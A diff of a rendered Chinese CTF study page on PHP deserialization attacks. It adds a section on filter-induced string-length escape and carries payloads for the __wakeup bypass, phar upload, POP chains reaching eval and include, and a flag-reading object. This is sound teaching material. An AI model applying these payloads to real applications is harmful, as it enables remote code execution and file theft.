@@ -1682,10 +1682,21 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#95" class="md-nav__link">
+  <a href="#95-geek_challenge2026" class="md-nav__link">
     <span class="md-ellipsis">
       
-        9.5 ⬜ 待打
+        9.5 ✅ Geek_Challenge2026 —— 过滤把长度变长
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#96" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.6 ⬜ 待打
       
     </span>
   </a>
@@ -3411,10 +3422,21 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#95" class="md-nav__link">
+  <a href="#95-geek_challenge2026" class="md-nav__link">
     <span class="md-ellipsis">
       
-        9.5 ⬜ 待打
+        9.5 ✅ Geek_Challenge2026 —— 过滤把长度变长
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#96" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9.6 ⬜ 待打
       
     </span>
   </a>
@@ -3733,34 +3755,75 @@
 <p><strong>PHP &lt; 5.6.25 / 7.0.10 有这个 bug(CVE-2016-7124):属性数大于真实数时,<code>__wakeup</code> 被跳过。</strong></p>
 <h3 id="2">② 长度不一致<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
 <p><strong><code>s:8:"flag.php"</code> 里的 8 必须对。</strong> 有些场景可以利用长度错位吃掉后面的字符(如 <code>s:5:"abc";}</code>)。</p>
+<h4 id="str_replace">过滤把字符串变长了(<code>str_replace</code> 类)<a class="headerlink" href="#str_replace" title="Permanent link">&para;</a></h4>
+<p><strong>这是长度不一致里最实用的一种。入口一般是「序列化 → 过滤 → 反序列化」:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">$ser = serialize($entry);</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">$escaped = filter($ser);       // 例如 str_replace("admin", "hacker", $data)</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="x">unserialize($escaped);</span>
+</span></code></pre></div>
+<p><strong><code>admin</code>(5 字节) 换成 <code>hacker</code>(6 字节),每替换一次多 1 字节;但长度数字是</strong>过滤前<strong>写进去的,不会跟着涨。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>过滤前   声明长度 N = 5A + len(b)
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>过滤后   实际长度   = 6A + len(b)        A = 短串出现次数，b = 注入串
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置
+</span></code></pre></div>
+<p><strong>把注入串 b 放在被过滤值的末尾,且 <strong>b 以 <code>";</code> 开头</strong>。这个 <code>";</code> 在过滤后处于 <code>6A</code> 处,要让解析器正好读到这里:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>5A + len(b) = 6A        →        A = len(b)
+</span></code></pre></div>
+<p><strong>也就是:短串重复的个数,必须等于注入串的长度。</strong></p>
+<table>
+<thead>
+<tr>
+<th>量</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>A</code></td>
+<td>被替换的短串重复次数(如 <code>admin</code> 出现几次)</td>
+</tr>
+<tr>
+<td><code>b</code></td>
+<td>注入串,<strong>必须以 <code>";</code> 开头</strong>,后面接想伪造的结构</td>
+</tr>
+<tr>
+<td>关键等式</td>
+<td><code>A == len(b)</code>,多一个少一个都会错位,<code>unserialize</code> 静默失败</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ 换命令时 b 会变长,<code>A</code> 必须跟着改。</strong> 长度用 <code>echo strlen($b)</code> 输出,不要手数。</p>
+<p><strong>判定成功的标志:</strong> 目标的多层 <code>echo</code> 依次出现(如 <code>Welcome…</code> → <code>？！强强？！</code> → <code>还有第二关</code> → <code>马上就到了</code> → <code>还有一步</code> → <code>RCE:</code>),说明每一层魔术方法都被触发了。</p>
+<p><strong>和 ① 的区别:</strong> ① 改的是「属性个数」,跳过 <code>__wakeup</code>;这里改的是「字符串长度」,让解析位置整体错位。两者都在利用<strong>声明与实际不一致</strong>。</p>
+<p>→ 实战见 <a href="#95-geek_challenge2026">9.5 Geek_Challenge2026</a></p>
 <h3 id="3-s">③ 大写 <code>S</code> 转义<a class="headerlink" href="#3-s" title="Permanent link">&para;</a></h3>
 <p><strong><code>s</code> 有对应的大写形式 <code>S</code>,允许十六进制转义:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>S:5:"\61\62\63\64\65"       ← 等价于 s:5:"abcde"
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>S:5:"\61\62\63\64\65"       ← 等价于 s:5:"abcde"
 </span></code></pre></div>
 <p><strong>用来绕过对特定字符串的正则匹配。</strong></p>
 <h3 id="4">④ 引用 <code>&amp;</code><a class="headerlink" href="#4" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>a:2:{i:0;s:4:"test";i:1;R:2;}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>a:2:{i:0;s:4:"test";i:1;R:2;}
 </span></code></pre></div>
 <p><strong><code>R:2</code> 表示引用第 2 个元素 —— 可以让两个属性指向同一个值。</strong></p>
 <hr />
 <h2 id="phar-unserialize">六、phar 反序列化(不需要 <code>unserialize</code>)<a class="headerlink" href="#phar-unserialize" title="Permanent link">&para;</a></h2>
 <p><strong>这是最容易被忽略的一种。</strong></p>
 <p><strong>只要代码里出现了 <code>phar://</code> 协议的文件操作,就会触发 phar 内部元数据的反序列化:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="x">file_exists("phar://uploads/avatar.jpg/test.txt");</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">file_exists("phar://uploads/avatar.jpg/test.txt");</span>
 </span></code></pre></div>
 <p><strong>哪怕只是 <code>file_exists</code> / <code>filesize</code> / <code>getimagesize</code>,也会触发。</strong></p>
 <p><strong>条件:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>① 有一个 phar 文件(通常靠文件上传)
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>② 代码里能控制到 phar:// 的路径
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>③ 有可用的魔术方法链
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>① 有一个 phar 文件(通常靠文件上传)
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>② 代码里能控制到 phar:// 的路径
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>③ 有可用的魔术方法链
 </span></code></pre></div>
 <p><strong>生成 phar 需要 <code>phar.readonly=Off</code>:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="x">$p = new Phar("evil.phar");</span>
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="x">$p-&gt;startBuffering();</span>
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="x">$p["test.txt"] = "x";                 // 随便一个文件</span>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="x">$p-&gt;setStub("</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">");</span>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="x">$p-&gt;setMetadata(new Flag());          // ← 这里放对象,序列化后存进 phar</span>
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="x">$p-&gt;stopBuffering();</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">$p = new Phar("evil.phar");</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">$p-&gt;startBuffering();</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">$p["test.txt"] = "x";                 // 随便一个文件</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="x">$p-&gt;setStub("</span><span class="cp">&lt;?php</span> <span class="nx">__HALT_COMPILER</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x">");</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="x">$p-&gt;setMetadata(new Flag());          // ← 这里放对象,序列化后存进 phar</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="x">$p-&gt;stopBuffering();</span>
 </span></code></pre></div>
 <p><strong>把 <code>evil.phar</code> 改名成 <code>.jpg</code> 上传,再用 <code>phar://</code> 引用即可。</strong></p>
 <p><strong>⚠️ PHP 8.0 之后,phar:// 的反序列化被限制了很多场景。</strong></p>
@@ -3768,21 +3831,21 @@
 <h2 id="pop">七、POP 链怎么找<a class="headerlink" href="#pop" title="Permanent link">&para;</a></h2>
 <p><strong>别从头读代码 —— 从「能干活的那个函数」往回找。</strong></p>
 <h3 id="_10">逆推四步<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>① 找 sink        哪个函数能读文件 / 执行代码 / 删文件
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>                  include / eval / system / file_get_contents / call_user_func
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>② 谁能碰到它      哪个魔术方法里调用了它
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>③ 那个方法怎么触发 对象当字符串?当函数?读不存在的属性?
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>④ 一路往回        直到 __wakeup / __destruct / unserialize
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>① 找 sink        哪个函数能读文件 / 执行代码 / 删文件
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>                  include / eval / system / file_get_contents / call_user_func
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>② 谁能碰到它      哪个魔术方法里调用了它
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>③ 那个方法怎么触发 对象当字符串?当函数?读不存在的属性?
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>④ 一路往回        直到 __wakeup / __destruct / unserialize
 </span></code></pre></div>
 <p><strong>Ezpop 就是这么找出来的:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>include($value)                         ← ① sink
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  ← Modifier::__invoke()                ← ② 谁调用了它
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>      ← 对象被当函数 $function()         ← ③ 怎么触发
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>      ← Test::__get()                   ← ② 谁在调用函数
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>          ← 读不存在的属性               ← ③
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>          ← Show::__toString()          ← ②
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>              ← 对象当字符串             ← ③
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>              ← Show::__wakeup()        ← ② 入口
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>include($value)                         ← ① sink
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>  ← Modifier::__invoke()                ← ② 谁调用了它
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>      ← 对象被当函数 $function()         ← ③ 怎么触发
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>      ← Test::__get()                   ← ② 谁在调用函数
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>          ← 读不存在的属性               ← ③
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>          ← Show::__toString()          ← ②
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>              ← 对象当字符串             ← ③
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>              ← Show::__wakeup()        ← ② 入口
 </span></code></pre></div>
 <h3 id="_11">魔术方法触发条件（找链时反复查这张表）<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
 <table>
@@ -3828,21 +3891,21 @@
 </tbody>
 </table>
 <p><strong>⚠️ 最容易搞错的一条：<code>__get</code> 不是「属性值为空」，是「这个类里根本没有这个属性」。</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">class Test { public $p; }</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">$t = new Test();</span>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">$t-&gt;source;            // ★ 触发 __get（类里没有 source）</span>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="x">$t-&gt;source = null;</span>
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="x">$t-&gt;source;            // ❌ 不触发（属性存在了，只是值为 null）</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">class Test { public $p; }</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">$t = new Test();</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="x">$t-&gt;source;            // ★ 触发 __get（类里没有 source）</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="x">$t-&gt;source = null;</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="x">$t-&gt;source;            // ❌ 不触发（属性存在了，只是值为 null）</span>
 </span></code></pre></div>
 <p><strong>所以「让某个属性不存在」比「把它设成 null」更重要 —— 而且往往你什么都不用做。</strong></p>
 <p><strong>危险操作(链尾)通常是:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>file_get_contents / file_put_contents / unlink / system / eval / call_user_func
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>file_get_contents / file_put_contents / unlink / system / eval / call_user_func
 </span></code></pre></div>
 <p><strong>一个最小的链长这样:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="x">class A { public $cmd;  function __destruct() { eval($this-&gt;cmd); } }</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">class A { public $cmd;  function __destruct() { eval($this-&gt;cmd); } }</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>O:1:"A":1:{s:3:"cmd";s:6:"phpinfo";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>O:1:"A":1:{s:3:"cmd";s:6:"phpinfo";}
 </span></code></pre></div>
 <p><strong><code>__destruct</code> 在脚本结束时自动触发 → 不需要额外操作。</strong></p>
 <hr />
@@ -3883,59 +3946,59 @@
 <h2 id="_13">九、实战记录<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
 <h3 id="91-zjctf-2019-nizhuansiwei">9.1 ✅ [ZJCTF 2019] NiZhuanSiWei —— 第三层<a class="headerlink" href="#91-zjctf-2019-nizhuansiwei" title="Permanent link">&para;</a></h3>
 <p><strong>入口:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">$password = unserialize($password);</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">echo $password;              // ← 关键:echo 把对象当字符串 → 触发 __toString</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">$password = unserialize($password);</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="x">echo $password;              // ← 关键:echo 把对象当字符串 → 触发 __toString</span>
 </span></code></pre></div>
 <p><strong><code>useless.php</code> 里的类:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">class Flag {</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="x">    public $file;</span>
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="x">    public function __tostring() {</span>
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="x">        if (isset($this-&gt;file)) {</span>
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="x">            echo file_get_contents($this-&gt;file);</span>
-</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="x">            echo "&lt;br&gt;";</span>
-</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="x">            return ("U R SO CLOSE !///COME ON PLZ");</span>
-</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="x">        }</span>
-</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="x">    }</span>
-</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">class Flag {</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="x">    public $file;</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="x">    public function __tostring() {</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="x">        if (isset($this-&gt;file)) {</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="x">            echo file_get_contents($this-&gt;file);</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="x">            echo "&lt;br&gt;";</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="x">            return ("U R SO CLOSE !///COME ON PLZ");</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="x">        }</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="x">    }</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>分析:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>① 属性 $file 完全由我们控制
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>② echo $password 触发 __tostring
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>③ __tostring 里 file_get_contents($this-&gt;file)
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>④ 所以要序列化一个 file 指向 flag 的 Flag 对象
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>① 属性 $file 完全由我们控制
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>② echo $password 触发 __tostring
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>③ __tostring 里 file_get_contents($this-&gt;file)
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>④ 所以要序列化一个 file 指向 flag 的 Flag 对象
 </span></code></pre></div>
 <p><strong>payload:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 </span></code></pre></div>
 <p><strong>对应 WP:<a href="../../../blog/zjctf-nizhuansiwei/">/blog/zjctf-nizhuansiwei/</a></strong></p>
 <p><strong>这题只用到一层,是最干净的反序列化入门。</strong></p>
 <h3 id="92-2019-php-__wakeup">9.2 ✅ [极客大挑战 2019] PHP —— <code>__wakeup</code> 绕过<a class="headerlink" href="#92-2019-php-__wakeup" title="Permanent link">&para;</a></h3>
 <p><strong>入口:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">include 'class.php';</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="x">$select = $_GET['select'];</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="x">$res = unserialize(@$select);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="x">include 'class.php';</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="x">$select = $_GET['select'];</span>
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="x">$res = unserialize(@$select);</span>
 </span></code></pre></div>
 <p><strong>类:</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">class Name {</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">    private $username = 'nonono';</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="x">    private $password = 'yesyes';</span>
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="x">    function __wakeup(){ $this-&gt;username = 'guest'; }   // ← 后门:反序列化后强制改名</span>
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="x">    function __destruct(){</span>
-</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="x">        if ($this-&gt;password != 100) { echo "NO!!!hacker!!!"; die(); }</span>
-</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="x">        if ($this-&gt;username === 'admin') { global $flag; echo $flag; }</span>
-</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="x">    }</span>
-</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">class Name {</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="x">    private $username = 'nonono';</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="x">    private $password = 'yesyes';</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="x">    function __wakeup(){ $this-&gt;username = 'guest'; }   // ← 后门:反序列化后强制改名</span>
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="x">    function __destruct(){</span>
